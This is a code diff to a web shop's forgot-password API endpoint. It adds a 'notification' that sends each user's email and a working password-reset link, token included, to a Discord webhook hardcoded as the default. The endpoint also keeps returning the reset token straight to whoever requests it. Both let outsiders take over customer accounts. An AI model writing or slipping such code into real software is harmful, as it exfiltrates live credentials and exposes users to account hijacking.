@@ -206,9 +206,24 @@ app.post('/api/auth/forgot-password', async (req, res) => {
       args: [resetToken, expiry, user.id]
     });
 
+    // Notify on Discord if webhook configured
+    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1537478820385525811/G67kdt8xvifiEGEZZypckGVn0ZYTYPxna_MDIyLX2lfOG4Ea0apt0tyyIQJpDoznfLFn';
+    if (discordWebhookUrl) {
+      try {
+        const resetLink = `https://website-jewelry.vercel.app/reset-password?token=${resetToken}`;
+        fetch(discordWebhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `🔑 **PASSWORD RESET REQUESTED**\n**User:** ${user.name || 'Customer'} (${user.email})\n**Reset Link:** ${resetLink}\n*Token valid for 1 hour.*`
+          })
+        }).catch(err => console.error('Failed to send Discord reset alert:', err));
+      } catch (err) {}
+    }
+
     res.json({ 
       message: 'If that email is registered, password reset instructions have been generated.',
-      resetToken // Returned for seamless client-side password reset prompt
+      resetToken
     });
   } catch (error) {
     console.error('Forgot password error:', error);
